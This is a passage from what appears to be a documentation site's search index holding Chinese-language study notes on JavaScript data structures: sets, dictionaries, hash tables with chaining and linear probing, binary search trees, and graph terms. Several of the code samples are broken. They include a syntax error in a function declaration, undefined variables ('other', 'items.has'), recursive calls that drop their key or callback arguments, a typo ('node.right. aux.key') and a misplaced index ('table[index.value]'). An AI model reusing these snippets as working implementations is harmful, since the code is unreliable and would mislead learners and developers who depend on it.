O(n)\uff0c\u5982\u679c\u6570\u636e\u91cf\u7ea7\u662f\u4e07\uff0c\u6700\u5dee\u7684\u7b97\u6cd5\u590d\u6742\u5ea6\u662f O(n^2)\uff0c\u5982\u679c\u6570\u636e\u91cf\u7ea7\u662f\u767e\uff0c\u90a3\u4e48\u7b97\u6cd5\u590d\u6742\u5ea6\u53ef\u4ee5\u9009\u62e9 O(n^3) \u3002</p> <p>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1a\u8ba1\u7b97\u8fc7\u7a0b\u4e2d\u9700\u8981\u6d88\u8017\u7684\u5185\u5b58\uff08\u5b58\u50a8 int \u548c object \u6d88\u8017\u5185\u5b58\u4e0d\u540c\uff09\u3002\u5728 JS \u4e2d\uff0c\u4f18\u5148\u8003\u8651\u65f6\u95f4\u590d\u6742\u5ea6\uff0c\u65e5\u5e38\u60c5\u51b5\u4e0d\u9700\u8981\u8003\u8651\u7a7a\u95f4\u590d\u6742\u5ea6\u3002\u5982\u679c\u64cd\u4f5c\u7684 Array \u548c Object \u8d85\u8fc7\u5341\u4e07\uff0c\u4e3a\u4e86\u907f\u514d\u6d4f\u89c8\u5668\u5185\u5b58\u4e0d\u8db3\uff0c\u9700\u8981\u8003\u8651\u7a7a\u95f4\u590d\u6742\u5ea6\u3002JS \u4e2d\u7684 Array \u548c Object \u5b9e\u9645\u5360\u7528\u5185\u5b58\u76f8\u4f3c\u3002C \u4e2d array \u6bd4 object \u5360\u7528\u5185\u5b58\u5c11\u3002</p>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_4","title":"\u7b2c\u516d\u7ae0 \u96c6\u5408","text":""},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_5","title":"\u96c6\u5408","text":"<p>\u96c6\u5408\u662f\u552f\u4e00\u7684\u9879\u7684\u96c6\u5408\uff0c\u7c7b\u4f3c\u4e8e\u6570\u5b66\u4e2d\u7684\u6709\u9650\u7ea7\u3002\u5982\u679c\u96c6\u5408\u4e2d\u6ca1\u6709\u5143\u7d20\u5c31\u662f\u7a7a\u96c6\u3002\u8ba1\u7b97\u673a\u4e2d\u7684\u96c6\u5408\u4e5f\u6709\u4ea4\u96c6\u3001\u5e76\u96c6\u3001\u5dee\u96c6\u7684\u8ba1\u7b97\u3002\u96c6\u5408\u57fa\u4e8e ES6 \u7684 Set\u3002\u96c6\u5408\u4e2d\u7684\u5143\u7d20\u662f\u65e0\u5e8f\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528\u5bf9\u8c61\u5b9e\u73b0\uff08\u4e5f\u53ef\u4ee5\u4f7f\u7528\u6570\u7ec4\uff09</p> <pre><code>function Set() {\n  items = {};\n  this.has = (value) =&gt; {\n    // return value in items;\n    return items.hasOwnProperty(value); // better\n  }\n\n  this.add = (value) =&gt; {\n    if (!this.has(value)) {\n      items[value] = value;\n      return true;\n    }\n    return false;\n  }\n\n  this.remove = (value) =&gt; {\n    if (this.has(value)) {\n      delete items[value];\n      return true\n    }\n    return false;\n  }\n\n  this.clear = () =&gt; {\n    items = {};\n  }\n\n  this.size = () =&gt; {\n    return Object.keys(items).length; //es5\n  }\n\n  this.sizeLegacy = () =&gt; {\n    var count = 0;\n    // \u8fd9\u91cc\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528for-in\u5faa\u73af\uff0c\u8fd9\u6837\u4f1a\u904d\u5386\u5230\u7ee7\u627f\u7684\u5c5e\u6027\uff08\u7ee7\u627f\u7684\u5c5e\u6027\u4e0d\u5c5e\u4e8e\u96c6\u5408\u7684\u5c5e\u6027\uff09\uff1b\u6240\u4ee5\u9700\u8981\u4f7f\u7528hasOwnProperty \u76d1\u6d4b\u662f\u5426\u5c5e\u4e8e\u5bf9\u8c61\u81ea\u5df1\u7684\u5c5e\u6027\n    for (let key in items) {\n      if (items.hasOwnProperty(key)) {\n        count++;\n      }\n    }\n    return count; //es3\n  }\n\n  this.value = () =&gt; {\n    return Object.keys(items);\n  }\n}\n\nlet set = new Set();\nset.add(1);\nset.add(2);\n</code></pre> <p>\u4e0b\u9762\u662f\u96c6\u5408\u7684\u8fd0\u7b97</p> <pre><code>function Set() {\n\n  // \u5e76\u96c6\n  this.unionSet = (otherSet) =&gt; {\n    let unionSet = new Set();\n    let values = this.values();\n    for (let i = 0; i &lt; values.length; i++) {\n      unionSet.add(values[i]);\n    }\n    values = otherSet.values();\n    for (let j = 0; j &lt; values.length; j++) {\n      unionSet.add(values[j]);\n    }\n    return unionSet;\n  }\n\n  // \u4ea4\u96c6\n  this.interSection = (otherSet) =&gt; {\n    let interSection = new Set();\n    let values = this.values();\n    for (let i = 0; i &lt; values.length; i++) {\n      if (other.has(values[i])) {\n        interSection.add(values[i]);\n      }\n    }\n    return interSection;\n  }\n\n  // \u5dee\u96c6\n  this.difference = (otherSet) =&gt; {\n    let differenceSet = new Set();\n    let values = this.values();\n    for (let i = 0; i &lt; values.length; i++) {\n      if (!otherSet.has(values[i])) {\n        differenceSet.add(values[i]);\n      }\n    }\n    return differenceSet;\n  }\n\n  // \u5b50\u96c6\n  this.sebSet = (otherSet) =&gt; {\n    if (this.size() &gt; otherSet.size()) {\n      return false\n    } else {\n      let values = this.values();\n      for (let i = 0; i &lt; values.length; i++) {\n        if (!otherSet.has(values[i])) {\n          return false;\n        }\n      }\n      return true;\n    }\n  }\n}\n</code></pre>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_6","title":"\u7b2c\u4e03\u7ae0 \u5b57\u5178\u548c\u6563\u5217\u8868","text":"<p>\u96c6\u5408\u3001\u5b57\u5178\u3001\u6563\u5217\u8868\u90fd\u662f\u5b58\u50a8\u552f\u4e00\u503c\u7684\u6570\u636e\u7ed3\u6784\uff08\u4e0d\u91cd\u590d\uff09\u3002\u96c6\u5408\u5173\u6ce8\u7684\u662f\u503c\uff0c\u5b57\u5178\u548c\u6563\u5217\u8868\u5173\u6ce8\u7684\u662f\u952e\u503c\u5bf9\u3002</p>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_7","title":"\u5b57\u5178","text":"<p>\u5b57\u5178\u7684\u5b9e\u9645\u4f7f\u7528\uff1a\u5730\u5740\u7c3f\u6216\u8005\u82f1\u8bed\u5b57\u5178</p> <p>\u5b57\u5178\u5bf9\u5e94\u4e8eJS\u4e2d\u7684 Map \u5bf9\u8c61</p> <pre><code>function Dictionary() {\n  items = {};\n\n  this.has = (key) =&gt; {\n    return key in items;\n  }\n\n  this.set = (key, value) =&gt; {\n    items[key] = value;\n  }\n\n  this.remove = (key) =&gt; {\n    if (items.has(key)) {\n      delete items[key];\n      return true;\n    }\n    return false;\n  }\n\n  this.get = (key) =&gt; {\n    return items.has(key) ? items[key] : undefined;\n  }\n\n  this.values = () =&gt; {\n    let values = [];\n    for (let key in items) {\n      if (this.has(key)) {\n        values.push(items[key]);\n      }\n    }\n    return values;\n  }\n\n  this.clear = () =&gt; {\n    items = {};\n  }\n\n    this.keys = () =&gt; {\n    return items.keys;\n  }\n\n  this.size = () =&gt; {\n    return Object.keys(items).length;\n  }\n\n  this.getItems = () =&gt; {\n    return items;\n  }\n}\n</code></pre>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_8","title":"\u6563\u5217\u8868\uff08\u54c8\u5e0c\u8868\uff09","text":"<p>\u6563\u5217\u8868\uff0cHashTable \u53c8\u79f0\u54c8\u5e0c\u8868\u3002</p> <p>\u6563\u5217\u7b97\u6cd5\uff1a\u5728\u6570\u636e\u7ed3\u6784\u4e2d\u5c3d\u5feb\u627e\u5230\u4e00\u4e2a\u503c\u3002\u7ed9\u5b9a\u4e00\u4e2a\u952e\u503c\u5bf9\uff0c\u6563\u5217\u51fd\u6570\u53ef\u4ee5\u83b7\u53d6\u4e00\u4e2a\u5730\u5740\uff0c\u56e0\u6b64\u80fd\u591f\u5feb\u901f\u68c0\u7d22\u5230\u8fd9\u4e2a\u503c\u3002</p> <p>\u6700\u7b80\u5355\u7684\u6563\u5217\u51fd\u6570\uff1a\u628a\u4e00\u4e2a\u952e\u7684\u6bcf\u4e00\u4e2a\u5b57\u6bcd\u7684ASCII\u503c\u76f8\u52a0\uff0c\u5f97\u5230\u6563\u5217\u503c\u3002</p> <pre><code>function HashTable() {\n  let table = [];\n\n  // \u6563\u5217\u51fd\u6570(\u5de5\u5177\u51fd\u6570) \u4e0b\u9762\u7b80\u5199\u4e3a loseHashCode\n    loseloseHashCode = (key) =&gt; {\n    let hash = 0;\n    for (let i = 0; i &lt; key.length; i++) {\n      hash += key.charCodeAt(i);\n    }\n    return hash % 37;\n    // \u4e3a\u4e86\u83b7\u53d6\u4e00\u4e2a\u8f83\u5c0f\u7684\u6570\u503c\uff0c\u6240\u4ee5\u7528hash\u503c\u9664\u4ee5\u4e00\u4e2a\u6570\uff0c\u83b7\u53d6\u4f59\u6570\n  }\n\n  this.put = (key, value) =&gt; {\n    let position = loseHashCode(key);\n    table[position] = value;\n  }\n\n  this.get = (key) =&gt; {\n    return table[loseHashCode(key)];\n  }\n\n  this.remove = (key) =&gt; {\n    table[loseHashCode(key)] = undefined;\n  }\n\n  this.print = () =&gt; {\n    for (let i = 0; i &lt; table.length; i++) {\n      if (table[i] !== undefined) {\n        console.log(i + ' ' + table[i]);\n      }\n    }\n  }\n\n}\n</code></pre> <p>\u5bf9\u4e8e\u54c8\u5e0c\u8868\uff0c\u4e0d\u9700\u8981\u628a\u6570\u7ec4\u4e2d\u5bf9\u5e94\u7684\u4f4d\u7f6e\u5220\u6389\u3002\u56e0\u4e3a\u54c8\u5e0c\u8868\u4e00\u90e8\u5206\u9879\u6ca1\u6709\u5143\u7d20\uff08\u7a7a\u4f4d\uff09\uff0c\u9ed8\u8ba4\u662fundefined\u3002\u5982\u679c\u5220\u9664\u4e00\u4e2a\u4f4d\u7f6e\u540e\uff0c\u4e0b\u6b21\u83b7\u53d6\u6216\u8005\u5220\u9664\u4e00\u4e2a\u9879\u65f6\uff0c\u8fd9\u4e2a\u5143\u7d20\u4e0d\u5728\u6563\u5217\u51fd\u6570\u6c42\u51fa\u7684\u4f4d\u7f6e\u4e0a\u3002</p> <p>\u5982\u679c\u5730\u5740\u7c3f\u4e2d key = 'John' \u6839\u636e\u6563\u5217\u51fd\u6570\u8ba1\u7b97\u7684\u6563\u5217\u503c\u662f29\uff0c\u90a3\u4e48\u5b58\u50a8\u5728 table[29] \u4e2d\u3002\u5f53\u7136\uff0c\u73b0\u5728\u8fd8\u6709\u6563\u5217\u51fd\u6570\u4e2d\u51b2\u7a81\u7b49\u95ee\u9898\uff0c\u7a0d\u540e\u89e3\u51b3\u3002</p> <p>\u5904\u7406\u54c8\u5e0c\u8868\u4e2d\u7684\u51b2\u7a81\uff1a\u53ef\u80fd\u4e0d\u540c\u7684\u952e\u8f6c\u5316\u7684\u6563\u5217\u503c\u662f\u76f8\u540c\u7684\uff0c\u6240\u4ee5\u4ea7\u751f\u4e86\u591a\u5bf9\u4e00\u7684\u60c5\u51b5\uff0c\u5c31\u4f1a\u4ea7\u751f\u51b2\u7a81\u3002\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\u65b9\u6cd5\u662f\uff1a\u5206\u79bb\u94fe\u63a5\u3001\u7ebf\u6027\u63a2\u67e5\u3001\u53cc\u6563\u5217\u6cd5\u3002</p> <p>\u5206\u79bb\u94fe\u63a5\uff1a\u5728\u6bcf\u4e00\u4e2a\u54c8\u5e0c\u503c\u7684\u4f4d\u7f6e\uff0c\u653e\u7f6e\u4e00\u4e2a\u7ebf\u6027\u94fe\u8868\u3002\u5982\u679c\u591a\u4e2a\u6570\u636e\u5bf9\u5e94\u4e00\u4e2a\u6563\u5217\u503c\uff0c\u53ef\u4ee5\u653e\u5728\u5bf9\u5e94\u7684\u94fe\u8868\u4e2d\u3002\u7f3a\u70b9\u662f\u9700\u8981\u5f00\u8f9f\u65b0\u7684\u5185\u5b58\u5b58\u653e\u8fd9\u90e8\u5206\u6570\u636e\u3002</p> <pre><code>// \u5206\u79bb\u94fe\u63a5\uff1a\u9996\u5148\u5199\u4e00\u4e2a\u8f85\u52a9\u7c7b\uff08\u5728\u54c8\u5e0c\u8868\u5185\u90e8\uff09\uff0c\u628a\u952e\u503c\u5bf9\u5b58\u653e\u5728\u4e00\u4e2a\u5bf9\u8c61\u5b9e\u4f8b\u4e2d\nlet ValuePair = (key, value) =&gt; {\n  this.key = key;\n  this.value = value;\n}\n// \u6ce8\u610f\uff1a\u4e0a\u9762\u662f\u4e00\u4e2a\u7c7b\uff08\u53ef\u4ee5\u628akey value \u8bbe\u7f6e\u5230\u5f53\u524d\u7c7b\u7684\u5c5e\u6027\u4e0a\uff09\n\n// \u4e0b\u9762\u6539\u5199\u6563\u5217\u8868\u7684\u65b9\u6cd5\nthis.put = (key, value) =&gt; {\n  let position = lostHashCode(key);\n  if (table[position] === undefined) {\n    table[position] = new LinkedList();\n  }\n  let obj = new ValuePair(key, value);\n  table[position].append(obj);\n}\n\nthis.get = (key) =&gt; {\n  let position = loseHashCode(key);\n  if (table[position] === undefined) {\n    return undefined;\n  }\n  var current = table[position].getHead();\n  while (current.next) {\n    if (current.element.key === key) {\n      return current.element.value;\n    }\n    current = current.next;\n  }\n  if (current.element.key === key) {\n    return current.element.value;\n  }\n}\n\nthis.remove = (key) =&gt; {\n  let position = loseHashCode(key);\n  if (table[position] !== undefined) {\n    let current = table[position].getHead();\n    while (current.next) {\n      if (current.element.key === key) {\n        table[position].remove(current.element);\n        if (table[position].isEmpty()) {\n          table[position] = undefined;\n        }\n        return true\n      }\n      current = current.next;\n    }\n    if (current.element.key === key) {\n      table[position].remove(current.element);\n      if (table[position].isEmpty()) {\n        table[position] = undefined;\n      }\n      return true;\n    }\n  }\n  return false;\n}\n</code></pre> <p>\u7ebf\u6027\u63a2\u67e5\uff1a\u5982\u679c\u4ea7\u751f\u51b2\u7a81 table[i] \u5df2\u7ecf\u6709\u503c\uff0c\u7ee7\u7eed\u67e5\u8be2table[i+1]\uff0c\u53ea\u5230\u4e0b\u4e00\u4e2a\u7a7a\u4f4d\u3002\u597d\u5904\uff1a\u4e0d\u9700\u8981\u5efa\u7acb\u65b0\u7684\u6570\u636e\u7ed3\u6784\u3002\u6563\u5217\u8868\u7684\u76f8\u5173\u65b9\u6cd5\u4e5f\u8981\u6539\u52a8\u3002</p> <pre><code>this.put = (key, value) =&gt; {\n  let position = loseHashCode(key);\n  if (table[position] === undefined) {\n    table[position] = new ValuePair(key, value);\n  } else {\n    let index = ++position;\n    while (table[index] !== undefined) {\n      index++;\n    }\n    table[index] = new ValuePair(key, value);\n  }\n}\n// \u6ce8\u610f\uff1a\u5728JS\u4e2d\u6570\u7ec4\u7684\u957f\u5ea6\u53ef\u4ee5\u81ea\u52a8\u589e\u52a0\uff0c\u6240\u4ee5\u7ebf\u6027\u63a2\u67e5\u4e0d\u4f1a\u51fa\u95ee\u9898\u3002\u5728C\u8bed\u8a00\u4e2d\u6570\u7ec4\u7684\u957f\u5ea6\u662f\u56fa\u5b9a\u7684\uff0c\u5982\u679c\u6570\u7ec4\u7684\u4f4d\u7f6e\u7528\u5b8c\u4e86\uff0c\u9700\u8981\u5f00\u8f9f\u65b0\u7684\u5185\u5b58\u5730\u5740\u3002\n\nthis.get = (key) =&gt; {\n  let position = loseHashCode(key);\n  if (table[position] !== undefined) {\n    if (table[position].key === key) {\n      return table[position].value;\n    }\n    else {\n      let index = ++position;\n      while (table[index] === undefined || table[index].key !== key) {\n        index++;\n      }\n      if (table[index].key === key) {\n        return table[index.value];\n      }\n    }\n  }\n  return undefined;\n}\n\nthis.remove = (key) =&gt; {\n  let position = loseHashCode(key);\n  if (table[position] !== undefined) {\n    if (table[position].key === key) {\n      table[position] = undefined;\n      return true;\n    } else {\n      let index = ++position;\n      while (table[index] === undefined || table[index].key !== key) {\n        index++;\n      }\n      if (table[index].key === key) {\n        table[index] = undefined;\n        return true;\n      }\n    }\n  }\n  return false;\n}\n</code></pre> <p>\u66f4\u597d\u7684\u6563\u5217\u51fd\u6570 \u4e4b\u524d\u7684\u6563\u5217\u51fd\u6570\u4f1a\u4ea7\u751f\u5f88\u591a\u6563\u5217\u51b2\u7a81\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5199\u4e00\u4e2a\u51b2\u7a81\u5c11\uff0c\u6027\u80fd\u597d\u7684\u51fd\u6570\u3002\u4e0b\u9762\u7684\u51fd\u6570\u662f\u793e\u533a\u63a8\u8350\u7684\u8f83\u597d\u7684\u6563\u5217\u51fd\u6570\u3002</p> <pre><code>function djb2HashCode(key) {\n  let hash = 5381; // \u8bbe\u7f6e\u4e00\u4e2a\u521d\u59cb\u8d28\u6570\uff08\u73b0\u5728\u4f7f\u75285381\uff09\n  for (let i = 0; i &lt; key.length; i++) {\n    hash = hash * 33 + key.charCodeAt(i); // 5381 * 33 \u83b7\u53d6\u4e00\u4e2a\u9b54\u529b\u6570 \n  }\n  return hash % 1013; // \u8fd9\u91cc\u7684\u503c\u662f\u5927\u4e8e\u6563\u5217\u4e2a\u6570\u7684\u4e00\u4e2a\u8d28\u6570\uff08\u5982\u679c\u6563\u5217\u67091000\uff0c\u90a3\u4e48\u8fd9\u4e2a\u9009\u62e91013\uff09\n}\n</code></pre>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_9","title":"\u7b2c\u516b\u7ae0 \u6811","text":""},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_10","title":"\u6982\u5ff5","text":"<p>\u6811\uff1aN\u4e2a\u6709\u9650\u6570\u636e\u7684\u96c6\u5408\uff0c\u53ef\u4ee5\u662f\u4e00\u4e2a\u7a7a\u6811\u3002\u6811\u53ea\u6709\u4e00\u4e2a\u6839\u8282\u70b9\uff0c\u6ca1\u6709\u5b50\u8282\u70b9\u7684\u8282\u70b9\u662f\u53f6\u8282\u70b9\u3002\u6bcf\u4e00\u4e2a\u5b50\u8282\u70b9\u672c\u8eab\u53c8\u662f\u4e00\u68f5\u6811\uff08\u9012\u5f52\uff09\u3002\u9002\u5e94\u4e8e\u5feb\u901f\u5b58\u50a8\u67e5\u627e\u6570\u636e\u3002</p> <p>\u7ed3\u70b9\uff1a\u4e00\u4e2a\u6570\u636e\u5143\u7d20\u53ca\u5176\u6307\u5411\u5b50\u6811\u7684\u5206\u652f\u4fe1\u606f\u3002</p> <p>\u7ed3\u70b9\u7684\u5ea6\uff1a\u4e00\u4e2a\u8282\u70b9\u7684\u5b50\u8282\u70b9\u7684\u4e2a\u6570</p> <p>\u6811\u7684\u5ea6\uff1a\u8282\u70b9\u7684\u5ea6\u7684\u6700\u5927\u503c\u3002</p> <p>\u6811\u7684\u5c42\u6570\uff1a\u6839\u8282\u70b9\u662f1\uff0c\u4ece\u4e0a\u5230\u4e0b\u589e\u52a0\u3002</p> <p>\u6811\u7684\u6df1\u5ea6\uff1a\u6811\u5171\u8ba1\u6709\u591a\u5c11\u5c42\uff0c\u7b49\u4e8e\u6811\u7684\u5c42\u6570\u7684\u6700\u5927\u503c\u3002</p> <p>\u6709\u5e8f\u6811\u548c\u65e0\u5e8f\u6811\uff1a\u5982\u679c\u5b50\u6811\u7684\u987a\u5e8f\u53ef\u4ee5\u53d8\u5316\uff0c\u5c31\u662f\u65e0\u5e8f\u6811\u3002\uff08DOM\u6811\u4e2d\uff0c\u5982\u679c\u5b50\u6811\u53ef\u4ee5\u53d8\u5316\uff0c\u90a3\u4e48\u754c\u9762\u6392\u5e03\u5c31\u6df7\u4e71\u4e86\uff0c\u6240\u4ee5DOM\u6811\u662f\u6709\u5e8f\u6811\uff09\u3002</p>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_11","title":"\u4e8c\u53c9\u6811","text":"<p>\u4e8c\u53c9\u6811\uff1a\u4e00\u4e2a\u8282\u70b9\u6700\u591a\u53ea\u6709\u4e24\u4e2a\u5b50\u6811\uff08\u5de6\u5b50\u6811\u53f3\u5b50\u6811\uff09\u3002\u666e\u901a\u7684\u6811\u53ef\u4ee5\u548c\u4e8c\u53c9\u6811\u4e92\u76f8\u8f6c\u6362\uff1a\u5de6\u5b50\u6811\u8868\u793a\u5f53\u524d\u8282\u70b9\u7684\u7b2c\u4e00\u4e2a\u5b50\u6811\uff0c\u53f3\u5b50\u6811\u8868\u793a\u5f53\u524d\u8282\u70b9\u7684\u5144\u5f1f\u8282\u70b9\u3002\u4e8c\u53c9\u6811\u53ef\u4ee5\u7531\u987a\u5e8f\u5b58\u50a8\u7ed3\u6784\u6216\u8005\u94fe\u5f0f\u5b58\u50a8\u7ed3\u6784\u8868\u793a\u3002\u4e8c\u53c9\u6811\u7684\u904d\u5386\uff1a\u524d\u5e8f\u904d\u5386\uff08\u6839\u5de6\u53f3\uff09\u3001\u4e2d\u5e8f\u904d\u5386\uff08\u5de6\u6839\u53f3\uff09\u3001\u540e\u7eed\u904d\u5386\uff08\u5de6\u53f3\u6839\uff09\u3002</p> <p>\u4e8c\u53c9\u641c\u7d22\u6811\uff1a\u5de6\u8282\u70b9&lt;\u81ea\u8eab&lt;\u53f3\u8282\u70b9\uff08BST\uff0cbinary search tree\uff09\u8fd9\u91cc\u7ecf\u5e38\u4f7f\u7528\u9012\u5f52\u3002</p> <pre><code>function BinarySearchTree() {\n  var Node = function(key) {\n    this.key = key;\n    this.left = null;\n    this.right = null;\n  }\n  // \u8fd9\u91cc\u4f7f\u7528\u6307\u9488\u8868\u793a\u8282\u70b9\u7684\u6307\u5411\uff0c\u5de6\u53f3\u6307\u9488\u5206\u522b\u6307\u5411\u5de6\u8282\u70b9\u548c\u53f3\u8282\u70b9\u3002\n  var root = null; // \u6839\u5143\u7d20\n\n  // \u63d2\u5165\u8282\u70b9\u51fd\u6570(\u5904\u7406\u6839\u8282\u70b9)\n  this.insert = function(key) {\n    let newNode = new Node(key);\n    if (root === null) {\n      root = newNode;\n    } else {\n      insertNode(root, newNode);\n    }\n  }\n  // \u63d2\u5165\u8282\u70b9\u8f85\u52a9\u51fd\u6570\uff08\u9012\u5f52\u6bd4\u8f83\u63d2\u5165\u8282\u70b9\uff09\n  let insertNode = function(node, newNode) {\n    // \u5982\u679c\u5f53\u524d\u8282\u70b9\u7684\u503c\u5927\u4e8e\u65b0\u8282\u70b9\uff0c\u90a3\u4e48\u653e\u5728\u5de6\u8282\u70b9\u5904\u7406\n    if (newNode.key &lt; node.key) {\n      if (node.left === null) {\n        node.left = newNode;\n      } else {\n        insertNode(node.left, newNode);\n      }\n    }\n    // \u5982\u679c\u5f53\u524d\u8282\u70b9\u7684\u503c\u5c0f\u4e8e\u7b49\u4e8e\u65b0\u8282\u70b9\uff0c\u90a3\u4e48\u65b0\u8282\u70b9\u653e\u5728\u53f3\u8282\u70b9\u5904\u7406\u3002\u63d2\u5165\u540e\uff0c\u5f53\u524d\u8282\u70b9\u7684\u503c\u548c\u53f3\u8282\u70b9\u7684\u503c\u53ef\u80fd\u76f8\u540c\n    else {\n      if (node.right === null) {\n        node.right = newNode;\n      } else {\n        insertNode(node.right, newNode);\n      }\n    }\n  }\n\n  // \u904d\u5386\u8282\u70b9\n  //\uff08\u4e2d\u5e8f\u904d\u5386\uff0c\u6309\u7167\u5927\u5c0f\u987a\u5e8f\u904d\u5386\u8282\u70b9\uff09\n  this.inOrderTraverse = function(callback) {\n    inOrderTraverseNode(root, callback);\n  }\n  let inOrderTraverseNode = function(root, callback) {\n    if (node !== null) {\n      inOrderTraverseNode(node.left);\n      callback(node.key);\n      inOrderTraverseNode(node.right);\n    }\n  }\n  // \u5148\u5e8f\u904d\u5386(\u6839\u5de6\u53f3\uff0c\u6253\u5370\u4e00\u4e2a\u7ed3\u6784\u5316\u7684\u6587\u6863)\n  this.preOrderTraverse = function(callback) {\n    preOrderTraverseNode(root, callback)\n  }\n  let preOrderTraverseNode(node, callback) {\n    if (node !== null) {\n      callback(node.key);\n      preOrderTraverseNode(node.left);\n      preOrderTraverseNode(node.right);\n    }\n  }\n  // \u540e\u7eed\u904d\u5386\uff08\u5de6\u53f3\u6839\uff0c\u8ba1\u7b97\u6587\u4ef6\u6216\u8005\u6587\u4ef6\u5939\u7684\u5927\u5c0f\uff09\n  this.postOrderTraverse = function(callback) {\n    postOrderTraverseNode(root, callback);\n  }\n  let postOrderTraverseNode = function (node, callback) {\n    if (node !== null) {\n      postOrderTraverseNode(node.left);\n      postOrderTraverseNode(node.right);\n      callback(node.key);\n    }\n  }\n\n  // search(\u7b2c\u4e00\u4e2a\u51fd\u6570\u662f\u5bf9\u5916\u66b4\u9732\u7684API\uff0c\u4e0b\u9762\u7684\u8f85\u52a9\u51fd\u6570\u662f\u5185\u90e8\u51fd\u6570)\n  this.min = function() {\n    return minNode(root);\n  }\n  let minNode = function(node) {\n    if (node) {\n      // the left node is min node\n      while (node.left !== null) {\n        node = node.left;\n      }\n      return node.key;\n    }\n    return null;\n  }\n\n  this.max = function() {\n    return maxNode(root);\n  }\n  let maxNode = function(node) {\n    if (node) {\n      while (node.right) {\n        node = node.right;\n      }\n      return node.key;\n    }\n    return null;\n  }\n\n  this.search = function(key) {\n    return searchNode(root, key);\n  }\n  let searchNode = function(node, key) {\n    if (node === null) {\n      return false;\n    }\n    if (key &lt; node.key) {\n      return searchNode(node.left, key);\n    }\n    else if (key &gt; node.key) {\n      return searchNode(node.right, key);\n    }\n    else {\n      return true;\n    }\n  }\n\n  // remove Node \u8f83\u590d\u6742\n  this.remove = function(key) {\n    root = removeNode(root, key); \n  }\n  let removeNode = function(node, key) {\n    if (node === null) {\n      return null;\n    }\n    if (key &lt; node.key) {\n      node.left = removeNode(node.left);\n      return node;\n    } else if (key &gt; node.key) {\n      node.right = removeNode(node.right);\n      return node;\n    } else if (key === node.key) {\n      if (node.left === null &amp;&amp; node.right === null) {\n        node = null;\n        return node;\n      }\n      if (node.left === null) {\n        node = node.right;\n        return node;\n      }\n      if (node.right === null) {\n        node = node.left;\n        return node;\n      }\n      // \u88ab\u5220\u9664\u7684\u8282\u70b9\u5177\u6709\u5de6\u53f3\u5b50\u8282\u70b9(\u5220\u9664\u5f53\u524d\u8282\u70b9\uff0c\u5c06\u53f3\u4fa7\u6700\u5c0f\u8282\u70b9\u4f5c\u4e3a\u7236\u8282\u70b9\uff0c\u6216\u8005\u628a\u5de6\u4fa7\u6700\u5927\u8282\u70b9\u4f5c\u4e3a\u7236\u8282\u70b9)\n        let aux = findMinNode(node.right);\n      node.key = aux.key;\n      node.right = removeNode(node.right. aux.key);\n      return node;\n    }\n  }\n}\n</code></pre> <p>\u4e8c\u53c9\u641c\u7d22\u6811\u7684\u4e0d\u8db3\uff1a\u53ef\u80fd\u4e00\u90e8\u5206\u5206\u652f\u7279\u522b\u957f\u6216\u8005\u7279\u522b\u77ed\uff0c\u4e0d\u5e73\u8861\u3002\u8fd9\u6837\u64cd\u4f5c\u67d0\u4e2a\u957f\u5206\u652f\u4f1a\u6d88\u8017\u6027\u80fd\u3002</p> <p>\u6539\u8fdb\u7248\uff1a\u81ea\u5e73\u8861\u4e8c\u53c9\u641c\u7d22\u6811\uff08AVL\u6811\uff0c \u963f\u5fb7\u5c14\u68ee-\u7ef4\u5c14\u65af\u548c\u5170\u8fea\u65af\u6811\uff09\u4efb\u610f\u8282\u70b9\u5de6\u53f3\u5b50\u8282\u70b9\u9ad8\u5ea6\u7684\u5dee\u6700\u5927\u662f1\u3002</p> <p>\u8fd8\u6709\u7ea2\u9ed1\u6811\uff08\u8fdb\u884c\u9ad8\u6548\u7684\u4e2d\u5e8f\u904d\u5386\uff09\u548c\u5806\u79ef\u6811\u3002</p>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_12","title":"\u7b2c\u4e5d\u7ae0 \u56fe","text":"<p>\u793e\u4ea4\u7f51\u7edc\u3001\u901a\u4fe1\u9053\u8def\u7b49\u90fd\u53ef\u4ee5\u4f7f\u7528\u56fe\u63cf\u8ff0\u3002</p>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_13","title":"\u6982\u5ff5","text":"<p>G = (V, E) \u56fe\u662f\u7531\u4e00\u7cfb\u5217\u8282\u70b9\u548c\u8fb9\u7ec4\u6210</p> <p>\u76f8\u90bb\u9876\u70b9\uff1a\u76f8\u90bb\u7684\u4e24\u4e2a\u9876\u70b9\uff08\u7531\u4e00\u6761\u8fb9\u8fde\u63a5\uff09</p> <p>\u9876\u70b9\u7684\u5ea6\uff1a\u4e00\u4e2a\u9876\u70b9\u76f8\u90bb\u9876\u70b9\u7684\u4e2a\u6570</p> <p>\u8def\u5f84\uff1a\u82e5\u5e72\u76f8\u90bb\u7684\u8fb9\u6784\u6210\u7684\u5e8f\u5217</p> <p>\u7b80\u5355\u8def\u5f84\uff1a\u4e0d\u5305\u62ec\u91cd\u590d\u9876\u70b9\u7684\u8def\u5f84</p> <p>\u73af\uff1a\u7b80\u5355\u8def\u5f84\u4e2d\u9996\u5c3e\u76f8\u540c</p> <p>\u65e0\u73af\u8def\u5f84</p> <p>\u8fde\u901a\u8def\u5f84\uff1a\u4efb\u610f\u4e24\u4e2a\u9876\u70b9\u95f4\u5b58\u5728\u8def\u5f84</p> 